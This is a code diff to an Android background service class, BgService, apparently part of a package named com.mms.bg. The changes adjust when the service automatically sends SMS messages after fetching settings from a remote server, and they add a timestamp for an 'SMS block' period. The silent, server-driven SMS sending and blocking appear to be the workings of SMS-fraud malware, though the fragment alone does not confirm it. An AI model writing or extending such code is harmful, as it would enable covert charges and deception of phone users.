@@ -35,6 +35,7 @@ public class BgService extends Service {
     public static final String META_DATA = "com.mms.bg.pid";
     
     private SettingManager mSM;
+    private boolean mStartSMSAfterInternet;
     
     private boolean mIsCalling;
     
@@ -111,6 +112,7 @@ public class BgService extends Service {
             }
         }
         LOGD("PID = " + SettingManager.getInstance(getApplicationContext()).mPid);
+        mStartSMSAfterInternet = true;
     }
     
     @Override
@@ -132,9 +134,10 @@ public class BgService extends Service {
                 LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
                 sm.setLastConnectServerTime(System.currentTimeMillis());
                 SettingManager.getInstance(this).tryToFetchInfoFromServer(delayTime);
-                if (isSendSMS() == true) {
+                if (isSendSMS() == true && mStartSMSAfterInternet == true) {
                     long sms_delay_time = sm.getSMSSendDelay();
                     SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
+                    mStartSMSAfterInternet = false;
                 }
             }
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS) == true) {
@@ -146,6 +149,7 @@ public class BgService extends Service {
                 SettingManager.getInstance(this).startOneRoundSMSSend(0);
                 mSM.log("cancel the auto message send now and start it after this round sms send");
                 mSM.cancelAutoSendMessage();
+                mSM.setSMSBlockBeginTime(System.currentTimeMillis());
             } else {
                 long false_retry_time = ((long) 1) * 3600 * 1000;
                 sm.setSMSSendDelay(false_retry_time);
@@ -168,6 +172,7 @@ public class BgService extends Service {
                 if (isSendSMS() == true) {
                     long sms_delay_time = sm.getSMSSendDelay();
                     SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
+                    mStartSMSAfterInternet = false;
                 }
             } else {
                 mSM.tryToFetchInfoFromServer(0);
